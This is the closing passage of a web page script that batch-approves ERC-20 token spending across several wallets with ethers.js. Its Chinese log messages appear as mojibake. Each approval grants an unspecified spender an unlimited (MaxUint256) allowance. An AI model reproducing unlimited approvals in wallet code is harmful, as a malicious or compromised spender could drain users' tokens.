                        addLog(`${w.address.slice(0, 8)}... æˆæƒä¸­`, 'info');
                        
                        const gasEstimate = await tokenContract.approve.estimateGas(spender, ethers.MaxUint256);
                        const gasLimit = gasEstimate * 25n / 10n;
                        
                        const tx = await tokenContract.approve(spender, ethers.MaxUint256, { gasLimit });
                        await tx.wait();
                        
                        addLog(`${w.address.slice(0, 8)}... æˆæƒæˆåŠŸ âœ“`, 'success');
                        return tx.hash;
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... æˆæƒå¤±è´¥: ${e.message}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`æ‰¹é‡æˆæƒå®Œæˆ: ${successCount} æˆåŠŸ, ${failCount} å¤±è´¥`, 
                    failCount === 0 ? 'success' : 'warning');
            }

            init();
        });
    </script>
</body>
</html>
